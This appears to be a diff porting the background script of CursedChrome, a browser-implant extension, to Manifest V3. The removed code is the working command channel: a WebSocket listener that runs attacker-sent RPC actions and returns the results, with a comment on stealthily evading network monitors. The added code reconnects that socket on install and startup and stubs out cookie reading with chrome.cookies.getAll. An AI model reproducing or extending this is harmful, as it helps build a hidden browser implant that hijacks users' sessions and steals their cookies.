@@ -286,70 +286,74 @@ async function perform_http_request(params) {
         )
     }
 }
+// beginning of manifest v3 code
+// Initialize WebSocket connection
+let websocket = null;
+const websocketURL = "ws://127.0.0.1:4343";
+function initializeWebSocket() {
+    websocket = new WebSocket(websocketURL);
 
-function initialize() {
-    // Replace the below connection URI with whatever
-    // the host details you're using are.
-    // ** Ideal setup is the following **
-    // Have Nginx doing a reverse-proxy (proxy_pass) to
-    // the CursedChrome server with a HTTPS cert setup. 
-    // For SSL/TLS WebSockets, instead of https:// you need
-    // to use wss:// as the protocol. For maximum stealth,
-    // setting the WebSocket port to be the standard 
-    // TLS/SSL port (this will make sure tools like little
-    // snitch don't alert on a new port connection from Chrome).
-    websocket = new WebSocket("ws://127.0.0.1:4343");
-
-    websocket.onopen = function(e) {
-        //websocket.send("My name is John");
+    websocket.onopen = function(event) {
+        console.log("WebSocket connection opened.");
+        // Handle WebSocket open event
     };
 
-    websocket.onmessage = async function(event) {
-        // Update last live connection timestamp
-        last_live_connection_timestamp = get_unix_timestamp();
+    websocket.onmessage = function(event) {
+        // Handle incoming WebSocket messages
+        console.log("WebSocket message received:", event.data);
+    };
 
-        try {
-            var parsed_message = JSON.parse(
-                event.data
-            );
-        } catch (e) {
-            console.error(`Could not parse WebSocket message!`);
-            console.error(e);
-            return
-        }
-
-        if (parsed_message.action in RPC_CALL_TABLE) {
-            const result = await RPC_CALL_TABLE[parsed_message.action](parsed_message.data);
-            websocket.send(
-                JSON.stringify({
-                    // Use same ID so it can be correlated with the response
-                    'id': parsed_message.id,
-                    'origin_action': parsed_message.action,
-                    'result': result,
-                })
-            )
-        } else {
-            console.error(`No RPC action ${parsed_message.action}!`);
-        }
+    websocket.onerror = function(event) {
+        console.error("WebSocket error observed:", event);
     };
 
     websocket.onclose = function(event) {
-        if (event.wasClean) {
-            console.log(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
-        } else {
-            // e.g. server process killed or network down
-            // event.code is usually 1006 in this case
-            console.log('[close] Connection died');
-        }
-    };
-
-    websocket.onerror = function(error) {
-        console.log(`[error] ${error.message}`);
+        console.log("WebSocket connection closed:", event);
+        // Optionally, attempt to reconnect
     };
 }
 
-initialize();
+// Example of using chrome.runtime.onInstalled
+chrome.runtime.onInstalled.addListener(() => {
+    console.log('Extension installed');
+    initializeWebSocket(); // Initialize WebSocket connection when extension is installed
+});
 
+// Example of using chrome.runtime.onStartup
+chrome.runtime.onStartup.addListener(() => {
+    console.log('Extension starting up');
+    initializeWebSocket(); // Reinitialize WebSocket connection when Chrome starts
+});
+
+// Simplified fetch request example
+async function performHttpRequest(url) {
+    try {
+        const response = await fetch(url);
+        const data = await response.json(); // Assuming JSON response
+        console.log(data);
+    } catch (error) {
+        console.error("Fetch error:", error);
+    }
+}
+
+// Simplified cookie access example
+async function getCookies(domain) {
+    try {
+        const cookies = await chrome.cookies.getAll({domain});
+        console.log(cookies);
+    } catch (error) {
+        console.error("Error getting cookies:", error);
+    }
+}
+
+// Simplified message handling from content scripts or popup
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    console.log("Message received:", message);
+    // Handle the message. For example, you could call performHttpRequest or getCookies based on the message
+    sendResponse({response: "Message processed by background service worker"});
+    return true; // Return true to indicate you wish to send a response asynchronously
+});
+//end of manifest v3 code
 /*
 
 Some headers are not set correctly when set by fetch(), so instead a
